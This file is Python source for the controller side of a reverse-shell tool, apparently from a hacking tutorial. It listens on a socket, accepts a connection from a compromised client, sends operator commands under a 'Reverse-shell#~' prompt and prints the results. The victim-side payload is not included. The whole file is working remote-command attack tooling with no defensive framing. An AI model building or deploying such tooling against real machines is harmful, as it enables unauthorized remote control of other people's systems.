import socket
import json


def reliable_send(data):
    data = str(data)
    json_data = json.dumps(data)
    target.send(json_data.encode())


def reliable_recv():
    json_data = ""
    while True:
        try:
            json_data = json_data + target.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue


def shell():
    while True:
        command = input("* Reverse-shell#~" + str(ip) + ": ")
        reliable_send(command)
        if command == "q":
            break
        else:
            result = reliable_recv()
            print("\n" + result)


def server():
    global s
    global ip
    global target
    s = socket.socket()
    s.bind(("localhost", 8000))
    s.listen(5)
    print("Listening for incoming connections...")
    target, ip = s.accept()
    print("New client connected!")


server()
shell()
s.close()
